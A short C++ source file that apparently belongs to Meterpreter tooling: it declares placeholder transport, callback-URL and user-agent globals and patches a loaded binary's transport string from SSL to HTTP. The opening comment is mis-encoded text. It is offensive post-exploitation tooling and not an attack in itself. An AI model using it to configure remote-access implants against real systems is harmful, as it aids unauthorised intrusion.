//»”„ «··Â «·—Õ„‰ «·—ÕÌ„
#include "main.h"

char* global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char* global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
char* global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661; //big
int global_comm_timeout       = 0xaf79257f; // 300


int wmain(int argc, wchar_t *argv[])
{

	BYTE* buffer = nullptr;
	DWORD bufferSize = 0;
	DWORD index = 0;
	///////////////////////////////
	// !!! Load from file stuff !!!
	///////////////////////////////
	// To be edited when options are added

	wchar_t filename[MAX_PATH] = {0};
	if(argc == 1)
	{
		wcscpy_s(filename,argv[0]);
	}
	else { wcscpy_s(filename,argv[1]);
	}

	bufferSize = CopyFileToBuffer(filename, &buffer);
	const char Transport[] = "METERPRETER_TRANSPORT_SSL";
	const char ReplacementTransport[] = "METERPRETER_TRANSPORT_HTTP";
	//PatchString(buffer, Transport, ReplacementTransport);
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)Transport, (int)strlen(Transport));
	PatchString(buffer, ReplacementTransport, index, strlen(ReplacementTransport));
	printf("[*] Offset found at 0x%08x\n", index);

	return 0;
}
